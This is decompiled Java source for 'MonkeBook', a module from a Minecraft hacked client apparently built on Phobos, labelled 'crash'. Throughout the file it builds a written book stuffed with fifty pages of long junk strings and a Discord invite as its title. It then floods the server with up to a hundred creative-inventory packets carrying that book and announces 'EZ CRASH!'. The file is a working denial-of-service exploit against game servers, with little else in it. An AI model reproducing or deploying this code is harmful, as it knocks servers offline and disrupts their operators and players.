/*    */ package me.earth.phobos.features.modules.misc;
/*    */ 
/*    */ import me.earth.phobos.features.command.Command;
/*    */ import me.earth.phobos.features.modules.Module;
/*    */ import me.earth.phobos.features.setting.Setting;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
/*    */ 
/*    */ 
/*    */ public class MonkeBook
/*    */   extends Module
/*    */ {
/* 19 */   private final Setting<Mode> mode = register(new Setting("Mode", Mode.Book));
/*    */   
/*    */   public MonkeBook() {
/* 22 */     super("MonkeBook", "crash", Module.Category.MISC, true, false, false);
/*    */   }
/*    */ 
/*    */   
/*    */   public void onUpdate() {
/* 27 */     if (this.mode.getValue() == Mode.Book && mc.field_71441_e != null && mc.field_71439_g != null) {
/*    */       
/* 29 */       ItemStack book = new ItemStack(Items.field_151099_bA);
/* 30 */       NBTTagList list = new NBTTagList();
/* 31 */       NBTTagCompound tag = new NBTTagCompound();
/* 32 */       String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"; int i;
/* 33 */       for (i = 0; i < 50; i++) {
/* 34 */         String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
/* 35 */         NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
/* 36 */         list.func_74742_a((NBTBase)tString);
/*    */       } 
/* 38 */       tag.func_74778_a("author", "Gqrl");
/* 39 */       tag.func_74778_a("title", "https://discord.gg/APwa6KyUFj");
/* 40 */       tag.func_74782_a("pages", (NBTBase)list);
/* 41 */       book.func_77983_a("pages", (NBTBase)list);
/* 42 */       book.func_77982_d(tag);
/* 43 */       for (i = 0; i < 100 && !mc.field_71439_g.func_175149_v(); i++) {
/* 44 */         mc.func_147114_u().func_147297_a((Packet)new CPacketCreativeInventoryAction(0, book));
/* 45 */         Command.sendMessage("§+Sent packets successfully, EZ CRASH!");
/*    */       } 
/*    */     } 
/*    */   }
/*    */   
/*    */   public enum Mode {
/* 51 */     Book;
/*    */   }
/*    */ }


/* Location:              C:\Users\42060\Downloads\Acid_4\Acid-cul-repo-1.0.1-release.jar!\me\earth\phobos\features\modules\misc\MonkeBook.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */